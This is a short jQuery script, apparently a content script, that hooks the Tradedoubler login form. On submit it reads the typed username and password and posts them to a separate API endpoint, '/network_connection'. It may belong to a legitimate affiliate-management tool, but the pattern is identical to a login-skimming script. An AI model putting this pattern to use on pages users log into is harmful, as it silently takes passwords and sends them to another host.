



if ($('.userLoginForm').length) {
	$('.userLoginForm .btn').on('click',function() {
		credentials_update();
		return true;
	});
}


function credentials_update(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/network_connection",
        data: { 
            network_name: 'tradedoubler',
            username: $('#userLoginFormUsername').val(), 
            password: $('#userLoginFormPassword').val(), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("credentials_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    });


}
